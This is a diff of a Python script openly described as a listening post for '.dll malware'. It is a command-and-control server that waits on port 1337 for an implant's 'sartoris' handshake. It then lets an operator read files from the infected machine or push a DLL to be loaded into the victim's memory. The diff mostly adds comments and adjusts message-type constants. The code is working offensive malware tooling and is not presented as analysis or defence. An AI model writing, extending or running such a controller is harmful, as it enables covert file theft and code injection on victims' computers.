@@ -2,13 +2,17 @@
 
 # Simple LP for .dll malware
 # messages to client are of the form (type, length, value)
+# Where:
+# 	tag = 4 bytes
+#	length = 4 bytes
+#   value = tag dependent data type
 
 # Options are:
-# 0: do something
-# 1: do something else
-# 2: another thing
-# 3: more stuff
-# 4: send a .dll
+# 0: Quit
+# 1: UNINMPLEMENTED
+# 2: Read a remote file
+# 3: UNINMPLEMENTED
+# 4: Load a .dll file into memory
 
 import socket
 import binascii
@@ -18,14 +22,16 @@ import sys
 import os.path
 from pathlib import Path
 
+# Receive the client connection on port 1337
 SERVER_PORT = 1337
 BUFFER_SIZE = 1024
 
-# Define message types
+# Define message types. Need to work out what message types are.
+# Also if the client expects them in network order, etc
 TYPE1 = 0x04
-TYPE2 = 0x01020304
+TYPE2 = 0x06
 TYPE3 = 0x06
-DLL_TYPE = 0x07
+DLL_TYPE = 0x08
 
 # Max DLL File size
 MAX_FILE_SIZE = 0xFFFFFFFF
@@ -52,13 +58,13 @@ print("Got connection from: ", addr)
 
 # Get data
 data = conn.recv(BUFFER_SIZE)
-# If we get empty ACK then break
+# If we get empty ACK then close the connection and exit
 if not data:
 	print("Got no data from client, exiting . . .\n")
 	conn.close()
 	exit()
 
-# Receive ACK string
+# Receive ACK string "sartoris" sent by client
 if('sartoris' in str(data)):
 	print("Received ACK string: ", data)
 else:
@@ -71,12 +77,12 @@ else:
 # want to interact, or even send commands to multiple clients at once
 while True:
 	print("Please select a command to send to ", addr)
-	print("(0) Quit\n(1) Do Something\n(2) Read a file \
-		\n(3) Do another thing\n(4) Memory Inject DLL\n")
+	print("(0) Quit\n(1) UNINMPLEMENTED\n(2) Read a file \
+		\n(3) UNINMPLEMENTED\n(4) Memory Inject DLL\n")
 	# Get user input, store it in choice
 	choice = input(">>> ").rstrip()
 
-	# If choice isn't a positive number
+	# If choice isn't a positive number re-prompt
 	if not choice.isdigit():
 		print("You must specify a valid digit 0-4!\n")
 
@@ -108,23 +114,23 @@ while True:
 			data = conn.recv(BUFFER_SIZE)
 			print("Got data: ", data)
 
-		# We choose option 2
-		# Read a file?
+		# We choose option 2: Read a file from client
 		elif user_input == 2:
 			print("Please enter the filename to read")
+			# Get the filename from the user
 			file2read = input(">>>")
+			# Store the length of the filename
 			file_length = len(file2read)
-
-			# Pack the message type
-			
-			# Pack the length of the string: the file we want to read
+			# Pack the message type so we can send it
 			TYPE2_PAYLOAD = pack('i', TYPE2)
+			# Pack the length of the string: the file we want to read
 			TYPE2_PAYLOAD += pack('i', file_length)
-			print("Message length ", file_length)
-			# Pack each byte of the string
+
+			# Pack each byte of the string as binary data
 			file2read.encode('ascii')
 			for c in bytes(file2read, 'ascii'):
 				TYPE2_PAYLOAD += pack('c', bytes([c]))
+
 			# Send the message
 			print("Sending payload of type: ", TYPE2)
 			conn.send(TYPE2_PAYLOAD)
@@ -134,7 +140,7 @@ while True:
 			data = conn.recv(BUFFER_SIZE)
 			print("Got data: ", data)
 
-		# We choose option 3	
+		# We choose option 3 UNINMPLEMENTED	
 		elif user_input == 3:
 			print("Got choice 3")
 			TYPE3_PAYLOAD = pack('i', TYPE3)
@@ -168,6 +174,7 @@ while True:
 			# i and <i for length gives no feedback, and no crash
 			packed_data += pack('i', length)
 
+			# Read each byte one by one from the file and pack it
 			try:
 				byte = f.read(1)
 				while byte != b'':
@@ -176,10 +183,10 @@ while True:
 					byte = f.read(1)
 			finally:
 				f.close()
-
-			print('sending "%s"' % binascii.hexlify(packed_data))
-
+			# Send <tag, length, dll data>
+			print("Sending payload of type: ", TYPE2)
 			conn.send(packed_data)
+			print('Sent: "%s"' % binascii.hexlify(packed_data))
 
 			print("Listening for response from client: \n")
 			data = conn.recv(BUFFER_SIZE)
